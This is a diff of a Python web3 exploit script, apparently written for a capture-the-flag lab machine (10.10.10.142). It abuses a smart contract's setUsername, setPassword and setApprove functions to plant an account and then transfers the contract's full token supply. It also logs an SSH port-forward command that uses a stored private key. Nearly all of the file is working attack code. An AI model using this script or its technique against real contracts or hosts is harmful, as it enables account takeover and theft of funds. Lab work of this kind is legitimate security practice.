@@ -4,6 +4,7 @@
 # Licensed under AGPL v3
 # Copyright(C) 2019 kmahyyg
 #
+import time
 
 from web3 import Web3
 import logging
@@ -37,6 +38,7 @@ except IndexError:
 
 # SSH Port Forward
 ethneturl = "http://localhost:8545"
+logger.critical("ssh -L 8545:127.0.0.1:63991 -N -T -i storage/chainsaw/bobby.key.enc bobby@10.10.10.142 -v")
 logger.info("The 127.0.0.1:63991 should be SSH-forwarded to {localip} as bobby@10.10.10.142".format(localip=ethneturl))
 
 # predenfined contract address read from the file
@@ -75,36 +77,41 @@ logger.info("Get Contract Functions: " + str(cur_cont_funcs))
 
 # SET PASSWORD AND NEW USER
 
-exploit1 = cur_cont_funcs.setUsername('nobody').transact()
+exploit1 = cur_cont_funcs.setUsername('fucky123').transact()
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit1))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit1)
-print("Receipt Found: ", sep='')
-print(w3eng.eth.getTransactionReceipt(exploit1))
+w3eng.eth.getTransactionReceipt(exploit1)
 
-exploit2 = cur_cont_funcs.setPassword('7b455ca1ffcb9f3828cfdde4a396139e').transact()
+exploit2 = cur_cont_funcs.setPassword('7b455ca1').transact()
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit2))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit2)
-print("Receipt Found: ", sep='')
-print(w3eng.eth.getTransactionReceipt(exploit2))
+w3eng.eth.getTransactionReceipt(exploit2)
 
 exploit3 = cur_cont_funcs.setApprove(True).transact()
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit3))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit3)
-print("Receipt Found: ", sep='')
-print(w3eng.eth.getTransactionReceipt(exploit3))
+w3eng.eth.getTransactionReceipt(exploit3)
 
-exploit4 = cur_cont_funcs.transfer(8).transact()
+exploitXI = cur_cont_funcs.getBalance().call()
+logger.critical("Current Account Balance: " + str(exploitXI))
+logger.info("All supply will be transfered.")
+
+exploitXII = cur_cont_funcs.getSupply().call()
+logger.critical("Current supply: " + str(exploitXII))
+time.sleep(5)
+
+exploit4 = cur_cont_funcs.transfer(int(exploitXII)).transact()
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit4))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit4)
-print("Receipt Found: ", sep='')
-print(w3eng.eth.getTransactionReceipt(exploit4))
+w3eng.eth.getTransactionReceipt(exploit4)
 
 # Get result
 
+print("Current Account Info: ")
 exploit5 = cur_cont_funcs.getUsername().call()
 print(exploit5)
 
@@ -121,3 +128,9 @@ exploit9 = cur_cont_funcs.getBalance().call()
 print(exploit9)
 
 logger.info("DONE!")
+
+rstflag = input("Do you need to reset?(uppercase Y/N)")
+if rstflag == "Y":
+    exploitX = cur_cont_funcs.reset().call()
+    print(exploitX)
+    logger.info("RESETED!")
